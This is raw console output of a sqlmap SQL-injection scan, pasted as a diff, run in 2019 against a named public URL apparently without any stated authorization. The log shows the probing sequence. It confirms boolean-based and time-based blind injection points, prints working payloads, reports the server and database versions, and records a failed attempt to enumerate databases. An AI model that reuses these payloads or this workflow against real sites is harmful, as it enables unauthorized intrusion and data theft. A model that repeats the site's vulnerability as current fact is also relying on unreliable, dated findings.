@@ -1,0 +1,120 @@
+https://pdsp.us/dikn37
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.3.44#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:14:47 /2019-05-28/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[14:14:47] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+do you want to try URI injections in the target URL itself? [Y/n/q] Y
+[14:14:48] [INFO] testing connection to the target URL
+[14:14:48] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:14:48] [INFO] testing if the target URL content is stable
+[14:14:49] [INFO] target URL content is stable
+[14:14:49] [INFO] testing if URI parameter '#1*' is dynamic
+[14:14:49] [INFO] URI parameter '#1*' appears to be dynamic
+[14:14:50] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
+[14:14:50] [INFO] testing for SQL injection on URI parameter '#1*'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[14:14:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:14:52] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[14:14:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:14:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[14:14:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[14:14:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[14:14:54] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[14:14:54] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[14:14:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:14:54] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:14:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:14:55] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:14:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:14:55] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[14:14:56] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:14:56] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:14:56] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[14:14:57] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[14:14:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[14:14:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[14:14:57] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[14:14:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[14:14:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[14:14:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[14:14:57] [INFO] testing 'MySQL inline queries'
+[14:14:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[14:14:57] [WARNING] time-based comparison requires larger statistical model, please wait.. (done)
+[14:14:58] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[14:14:59] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[14:14:59] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[14:14:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[14:15:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[14:15:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[14:15:11] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
+[14:15:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:15:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:15:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:15:13] [INFO] target URL appears to have 4 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[14:15:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[14:15:27] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[14:15:32] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[14:15:38] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[14:15:43] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[14:15:49] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[14:15:54] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[14:15:59] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[14:16:05] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[14:16:10] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[14:16:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[14:16:20] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[14:16:26] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[14:16:31] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[14:16:36] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[14:16:42] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[14:16:47] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[14:16:52] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[14:16:58] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[14:17:03] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[14:17:09] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 500 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: https://pdsp.us:443/dikn37' AND 6356=6356-- uiDN
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: https://pdsp.us:443/dikn37' AND SLEEP(5)-- OUHO
+---
+[14:17:17] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.16, PHP 5.6.16
+back-end DBMS: MySQL >= 5.0.12
+[14:17:17] [INFO] fetching database names
+[14:17:17] [INFO] fetching number of databases
+[14:17:17] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:17:17] [INFO] retrieved: 
+[14:17:18] [WARNING] unexpected HTTP code '403' detected. Will use (extra) validation step in similar cases
+
+[14:17:18] [INFO] retrieved: 
+[14:17:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[14:17:19] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:17:19] [ERROR] unable to retrieve the number of databases
+[14:17:19] [INFO] falling back to current database
+[14:17:19] [INFO] fetching current database
+[14:17:19] [INFO] retrieved: 
+[14:17:20] [INFO] retrieved: 
+[14:17:21] [CRITICAL] unable to retrieve the database names
+[14:17:21] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 461 times
+[14:17:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/pdsp.us'
+
+[*] ending @ 14:17:21 /2019-05-28/
+
